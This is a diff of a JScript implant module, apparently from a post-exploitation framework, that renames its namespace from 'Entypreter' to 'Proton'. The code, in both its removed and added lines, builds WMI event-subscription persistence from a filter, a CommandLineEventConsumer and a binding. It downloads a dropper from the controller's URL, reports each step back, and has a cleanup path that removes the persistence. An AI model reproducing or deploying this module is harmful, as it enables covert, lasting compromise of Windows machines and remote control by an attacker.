@@ -2,8 +2,8 @@ try
 {
 
     var headers = {};
-    var subname = "Entypreter";
-    var droppath = entypreter.file.getPath("~FDROPDIR~\\~FDROPFILE~");
+    var subname = "Proton";
+    var droppath = proton.file.getPath("~FDROPDIR~\\~FDROPFILE~");
 
     if (~CLEANUP~)
     {
@@ -20,10 +20,10 @@ try
             }
         }
         headers["Task"] = "RemovePersistence";
-        entypreter.work.report("done", headers);
+        proton.work.report("done", headers);
         headers["Task"] = "DeleteDropper";
-        entypreter.file.deleteFile(droppath);
-        entypreter.work.report(entypreter.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
+        proton.file.deleteFile(droppath);
+        proton.work.report(proton.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
     }
     else
     {
@@ -36,7 +36,7 @@ try
         eventfilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300";
         var res = eventfilter.Put_();
         headers["Task"] = "CreateFilter";
-        entypreter.work.report(res.Path, headers);
+        proton.work.report(res.Path, headers);
 
         var wmi2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
         var commandlineeventclass = wmi2.Get("CommandLineEventConsumer");
@@ -46,7 +46,7 @@ try
         commandlineevent.RunInteractively = "false";
         res = commandlineevent.Put_();
         headers["Task"] = "CreateConsumer";
-        entypreter.work.report(res.Path, headers);
+        proton.work.report(res.Path, headers);
 
         var wmi3 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription");
         var filtertoconsumerbindingclass = wmi3.Get("__FilterToConsumerBinding");
@@ -55,19 +55,19 @@ try
         filtertoconsumerbinding.Consumer = "CommandLineEventConsumer.Name=\""+subname+"\"";
         res = filtertoconsumerbinding.Put_();
         headers["Task"] = "CreateBinding";
-        entypreter.work.report(res.Path, headers);
+        proton.work.report(res.Path, headers);
 
         headers["X-UploadFileJob"] = "true";
-        entypreter.http.downloadEx("POST", entypreter.work.make_url(), headers, droppath);
+        proton.http.downloadEx("POST", proton.work.make_url(), headers, droppath);
         headers["X-UploadFileJob"] = "false";
         headers["Task"] = "AddDropper";
-        entypreter.work.report(entypreter.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
+        proton.work.report(proton.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
     }
-    entypreter.work.report("Complete");
+    proton.work.report("Complete");
 }
 catch (e)
 {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.exit();
+proton.exit();
